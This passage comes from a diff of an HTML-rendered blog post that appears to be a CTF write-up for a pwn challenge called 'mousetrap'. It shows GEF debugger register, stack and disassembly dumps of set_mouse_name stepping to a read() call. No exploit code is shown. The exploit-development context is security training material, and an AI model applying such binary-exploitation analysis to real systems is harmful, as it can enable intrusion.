+&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2d&lt;/span&gt;              
+&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007ffff7fe3530&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_dl_fini&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbp&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007ffff7fef7c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2544&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pxor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmm0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmm0&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x246&lt;/span&gt;             
+&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000400630&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebp&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdd90&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x0000000000000001&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ZERO&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;carry&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PARITY&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;adjust&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sign&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INTERRUPT&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;direction&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resume&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;virtualx86&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;identification&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0033&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x002b&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; 
+&lt;span class=&quot;err&quot;&gt;───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stack&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb70&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdcb0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;	 &lt;span class=&quot;err&quot;&gt;←&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb78&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0008&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000040087d&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb80&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0010&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdd98&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00007fffffffe120&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]&quot;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb88&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0018&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000001ffffdcd0&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb90&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000000&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb98&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0028&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000000&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdba0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0030&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000000&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdba8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0038&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007ffff7ffe730&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00007ffff7fd2000&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00010102464c457f&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x400786&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+     &lt;span class=&quot;mh&quot;&gt;0x400787&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;93&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;        &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4855c35d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x40078d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;
+ &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x40078f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x400793&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x400797&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1b2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# 0x400950&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x40079e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x4007a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x400600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x4007a8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;threads&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#0] Id 1, Name: &quot;mousetrap&quot;, stopped 0x40078f in set_mouse_name (), reason: BREAKPOINT&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trace&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#0] 0x40078f → set_mouse_name()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#1] 0x40087d → main()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Then I run &lt;code class=&quot;highlighter-rouge&quot;&gt;ni&lt;/code&gt; till I reached to &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt; where my value was stored.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-gef➤  ni
-0x00000000004007b9 in set_mouse_name ()
-[ Legend: Modified register | Code | Heap | Stack | String ]
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
-$rax   : 0x00007fffffffdc90  →  0x00000000004008c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
-$rbx   : 0x0               
-$rcx   : 0x0               
-$rdx   : 0x20              
-$rsp   : 0x00007fffffffdb60  →  0x0000000000000000
-$rbp   : 0x00007fffffffdb70  →  0x00007fffffffdcb0  →  0x00000000004008c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
-$rsi   : 0x00007fffffffdc90  →  0x00000000004008c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
-$rdi   : 0x0               
-$rip   : 0x00000000004007b9  →  &amp;lt;set_mouse_name+46&amp;gt; call 0x400610 &amp;lt;read@plt&amp;gt;
-$r8    : 0x2d              
-$r9    : 0x6               
-$r10   : 0x0000000000400950  →  0x4500203a656d614e (&quot;Name: &quot;?)
-$r11   : 0x246             
-$r12   : 0x0000000000400630  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
-$r13   : 0x00007fffffffdd90  →  0x0000000000000001
-$r14   : 0x0               
-$r15   : 0x0               
-$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
-$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
-0x00007fffffffdb60│+0x0000: 0x0000000000000000	 ← $rsp
-0x00007fffffffdb68│+0x0008: 0x00007fffffffdc90  →  0x00000000004008c0  →  `__libc_csu_init+0` push r15
-0x00007fffffffdb70│+0x0010: 0x00007fffffffdcb0  →  0x00000000004008c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15	 ← $rbp
-0x00007fffffffdb78│+0x0018: 0x000000000040087d  →  &amp;lt;main+59&amp;gt; mov rdx, QWORD PTR [rbp-0x8]
-0x00007fffffffdb80│+0x0020: 0x00007fffffffdd98  →  0x00007fffffffe120  →  &quot;/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]&quot;
-0x00007fffffffdb88│+0x0028: 0x00000001ffffdcd0
-0x00007fffffffdb90│+0x0030: 0x0000000000000000
-0x00007fffffffdb98│+0x0038: 0x0000000000000000
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
-     0x4007ac &amp;lt;set_mouse_name+33&amp;gt; mov    edx, 0x20
-     0x4007b1 &amp;lt;set_mouse_name+38&amp;gt; mov    rsi, rax
-     0x4007b4 &amp;lt;set_mouse_name+41&amp;gt; mov    edi, 0x0
- →   0x4007b9 &amp;lt;set_mouse_name+46&amp;gt; call   0x400610 &amp;lt;read@plt&amp;gt;
-   ↳    0x400610 &amp;lt;read@plt+0&amp;gt;     jmp    QWORD PTR [rip+0x200a22]        # 0x601038 &amp;lt;read@got.plt&amp;gt;
-        0x400616 &amp;lt;read@plt+6&amp;gt;     push   0x4
-        0x40061b &amp;lt;read@plt+11&amp;gt;    jmp    0x4005c0
-        0x400620 &amp;lt;setvbuf@plt+0&amp;gt;  jmp    QWORD PTR [rip+0x200a1a]        # 0x601040 &amp;lt;setvbuf@got.plt&amp;gt;
-        0x400626 &amp;lt;setvbuf@plt+6&amp;gt;  push   0x5
-        0x40062b &amp;lt;setvbuf@plt+11&amp;gt; jmp    0x4005c0
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
-read@plt (
-   $rdi = 0x0000000000000000,
-   $rsi = 0x00007fffffffdc90 → 0x00000000004008c0 → `libc_csu_init+0` push r15,
-   $rdx = 0x0000000000000020
-)
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: &quot;mousetrap&quot;, stopped 0x4007b9 in `set_mouse_name` (), reason: SINGLE STEP
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
-[#0] 0x4007b9 → `set_mouse_name()`
-[#1] 0x40087d → main()
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-gef➤  
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;ni&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004007b9&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Legend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Modified&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;register&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Heap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Stack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;registers&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdc90&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;              
